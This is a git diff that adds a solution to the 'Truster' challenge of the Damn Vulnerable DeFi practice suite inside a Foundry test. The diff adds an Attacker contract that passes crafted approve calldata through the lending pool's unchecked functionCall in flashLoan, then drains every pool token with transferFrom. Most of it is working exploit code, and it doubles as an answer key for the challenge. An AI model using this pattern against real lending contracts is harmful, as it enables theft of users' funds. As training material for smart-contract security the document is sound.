@@ -51,7 +51,11 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        // Perform the attack from a different contract to comply
+        // with the nonce check in the success conditions.
+        // If you execute the attack in this function, the nonce will remain 0.
+        Attacker attacker = new Attacker(pool, token, player, recovery);
+        attacker.attack();
     }
 
     /**
@@ -64,5 +68,33 @@ contract TrusterChallenge is Test {
         // All rescued funds sent to recovery account
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+    }
+}
+
+contract Attacker {
+    TrusterLenderPool internal pool;
+    DamnValuableToken internal token;
+    address internal player;
+    address internal recovery;
+
+    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _player, address _recovery) {
+        pool = _pool;
+        token = _token;
+        player = _player;
+        recovery = _recovery;
+    }
+
+    function attack() public {
+        // The correct encoding should include the selector and arguments separately, not nested.
+        // This attack is straightforward: We leverage `target.functionCall(data)` in the flashLoan function
+        // to issue an ERC20 approval, allowing us to drain all the funds from the pool.
+        bytes memory data = abi.encodeWithSelector(token.approve.selector, address(this), type(uint256).max);
+
+        // The flashLoan function does not check for amount = 0, so we don't need to return any funds.
+        pool.flashLoan(0, address(this), address(token), data);
+
+        // The transferFrom function checks that msg.sender has sufficient allowance.
+        // We can now transfer the funds to the recovery address.
+        token.transferFrom(address(pool), recovery, token.balanceOf(address(pool)));
     }
 }
